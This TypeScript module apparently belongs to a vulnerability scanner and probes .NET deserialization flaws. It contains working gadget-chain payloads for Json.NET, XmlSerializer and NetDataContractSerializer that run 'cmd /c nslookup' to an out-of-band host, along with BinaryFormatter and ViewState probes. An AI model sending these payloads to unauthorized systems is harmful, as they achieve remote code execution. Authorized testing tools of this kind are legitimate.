// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'deserialization-dotnet',
  family: 'deserialization',
  title: '.NET BinaryFormatter / ViewState deserialization',
  severity: 'critical',
  destructiveRisk: 'none',
  requiresOast: true,
  requiresBrowser: false,
  insertionPointKinds: ['body', 'cookie', 'query', 'header'],
  expectedSignals: ['oast-callback-confirmed', 'error-disclosure', 'status-delta'],
  cwe: [502],
};

// .NET BinaryFormatter magic header: 00 01 00 00 00 (b64 prefix: AAEAAAD...)
const DOTNET_BF_MAGIC = 'AAEAAAD/////AQAAAAAAAAAMAgAAAFJTeXN0ZW0';

export function variants(ctx: ProbeContext): PayloadVariant[] {
  const oastHost = ctx.oastBaseUrl ? new URL(ctx.oastBaseUrl).hostname : 'oast.pf.example';
  return [
    {
      id: 'deser-dotnet-bf-magic',
      family: 'deserialization',
      value: DOTNET_BF_MAGIC,
      encoding: 'raw',
      intent: '.NET BinaryFormatter magic bytes — triggers deserialization error/exception',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure', 'status-delta'],
    },
    {
      id: 'deser-dotnet-viewstate',
      family: 'deserialization',
      value: '/wEyNjI1NjI1NjI1NjI1NjI1NjI1AAAAARkBASM=',
      encoding: 'raw',
      intent: 'ASP.NET ViewState without MAC — attempts forged ViewState deserialization',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure'],
    },
    {
      id: 'deser-dotnet-json-net',
      family: 'deserialization',
      value: `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c nslookup ${oastHost}"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}`,
      encoding: 'json-string',
      intent: 'Json.NET TypeNameHandling.All gadget — ObjectDataProvider RCE via OAST',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'deser-dotnet-xmlserial',
      family: 'deserialization',
      value: `<?xml version="1.0"?><root type="System.Data.Services.Internal.ExpandedWrapper\`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0]], System.Data.Services, Version=4.0.0.0"><ExpandedWrapperOfXamlReaderObjectDataProvider><ExpandedElement/><ProjectedProperty0><MethodName>Parse</MethodName><MethodParameters><anyType xmlns:b64="urn:dtd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="b64:string"><![CDATA[nslookup ${oastHost}]]></anyType></MethodParameters><ObjectInstance xsi:type="XamlReader"/></ProjectedProperty0></ExpandedWrapperOfXamlReaderObjectDataProvider></root>`,
      encoding: 'raw',
      intent: '.NET XmlSerializer gadget chain via OAST DNS lookup',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'deser-dotnet-los',
      family: 'deserialization',
      value: '/wEyAAAAOVN5c3RlbS5XZWIuVUkuTG9zRm9ybWF0dGVy',
      encoding: 'raw',
      intent: 'LosFormatter (Web Forms) serialized data probe',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure'],
    },
    {
      id: 'deser-dotnet-netdatacontract',
      family: 'deserialization',
      value: `<root xmlns:i="http://www.w3.org/2001/XMLSchema-instance" z:Type="System.Windows.Data.ObjectDataProvider" z:Assembly="PresentationFramework, Version=4.0.0.0" xmlns:z="http://schemas.microsoft.com/2003/10/Serialization/" xmlns=""><MethodName>Start</MethodName><ObjectInstance z:Type="System.Diagnostics.Process" z:Assembly="System"><StartInfo z:Type="System.Diagnostics.ProcessStartInfo" z:Assembly="System"><Arguments>/c nslookup ${oastHost}</Arguments><FileName>cmd.exe</FileName></StartInfo></ObjectInstance></root>`,
      encoding: 'raw',
      intent: 'NetDataContractSerializer ObjectDataProvider gadget via OAST',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const body = resp.bodyText.toLowerCase();
  const dotnetError = body.includes('serializationexception') || body.includes('binaryformatter') ||
    body.includes('viewstate') || body.includes('system.runtime') || body.includes('formatexception');

  if (variant.requiresOast) {
    responseClass = 'neutral-or-not-parsed';
    confidence = 0.2;
    nextAction = 'continue';
    evidence.push('OAST probe dispatched — awaiting .NET gadget callback');
  } else if (dotnetError) {
    responseClass = 'parser-error';
    confidence = 0.8;
    nextAction = 'confirm';
    evidence.push('.NET serialization exception in response body — deserialization endpoint confirmed');
  } else if (resp.statusCode !== baseline.statusCode) {
    responseClass = 'status-delta';
    confidence = 0.4;
    nextAction = 'continue';
    evidence.push(`Status delta ${baseline.statusCode}→${resp.statusCode}`);
  } else {
    nextAction = 'stop-negative';
    evidence.push('No .NET deserialization signal');
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
